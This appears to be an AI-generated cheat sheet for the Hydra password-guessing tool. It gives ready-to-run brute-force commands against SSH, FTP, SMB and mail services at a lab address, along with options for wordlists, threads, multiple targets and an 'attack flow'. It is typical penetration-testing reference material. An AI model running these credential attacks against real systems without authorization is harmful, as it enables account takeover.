Here’s your **Hydra Command Cheat Sheet (brief + structured note style)**:

---

# 🧠 Hydra `hydra` Cheat Sheet

---

> [!info] 🧩 Basic Syntax

```bash
hydra [options] service://target
```

**Example**

```bash
hydra -l admin -p password ssh://10.10.10.10
```

---

> [!tip] 👤 Username & Password Options

```bash
-l username            # single username
-L userlist.txt        # username list

-p password            # single password
-P passlist.txt        # password list
-C creds.txt           # format: user:pass
```

---

> [!danger] 💥 SSH Brute Force Example

```bash
-hydra -L users.txt -P passwords.txt ssh://10.10.10.10
```

---

> [!danger] 🌐 FTP Attack Example

```bash
hydra -L users.txt -P passwords.txt ftp://10.10.10.10
```

---

> [!danger] 🪟 SMB Attack Example

```bash
hydra -L users.txt -P passwords.txt smb://10.10.10.10
```

---

> [!danger] 📧 SMTP / POP3 / IMAP

```bash
hydra -L users.txt -P passwords.txt smtp://10.10.10.10
hydra -L users.txt -P passwords.txt pop3://10.10.10.10
hydra -L users.txt -P passwords.txt imap://10.10.10.10
```

---

> [!tip] ⚡ Speed Control (VERY IMPORTANT)

```bash
-t 4      # threads (default 16)
-w 30     # timeout per connection
-W 1      # wait between attempts
```

**Example**

```bash
hydra -t 4 -L users.txt -P passwords.txt ssh://10.10.10.10
```

---

> [!warning] 🧠 Stop Conditions

```bash
-f        # stop after first valid credential per host
-F        # stop completely after first valid result
```

---

> [!tip] 🔐 SSL / Secure Services

```bash
-S        # enable SSL
```

**Example**

```bash
hydra -S -L users.txt -P pass.txt imaps://10.10.10.10
```

---

> [!info] 📁 Output Results

```bash
-o result.txt
-b json
```

**Example**

```bash
hydra -L users.txt -P pass.txt ssh://10.10.10.10 -o results.txt
```

---

> [!tip] 🔁 Password Generation (Bruteforce Mode)

```bash
-x MIN:MAX:CHARSET
```

**Example**

```bash
hydra -l admin -x 4:6:a1 ssh://10.10.10.10
```

* `a` = lowercase
* `A` = uppercase
* `1` = numbers
* `!` = symbols

---

> [!danger] 🌍 Multiple Targets

```bash
-M targets.txt
```

**Example**

```bash
hydra -L users.txt -P pass.txt -M targets.txt ssh
```

---

> [!tip] 🔑 Extra Login Tricks

```bash
-e nsr
```

* `n` = null password
* `s` = username as password
* `r` = reversed username

---

> [!info] 📡 Port Override

```bash
-s 2222
```

**Example**

```bash
hydra -s 2222 -L users.txt -P pass.txt ssh://10.10.10.10
```

---

# ⚡ Real-World Workflow

> [!success] 🧠 Typical Attack Flow

```bash
1. Get users (enum)
2. Get passwords (OSINT / wordlists)
3. Run hydra
4. Validate access
```

---

> [!warning] 🚨 Pro Tips

* Always start with small threads (`-t 4`)
* Prefer targeted wordlists over huge ones
* Combine with OSINT-based usernames
* Stop early using `-f` to save time

---

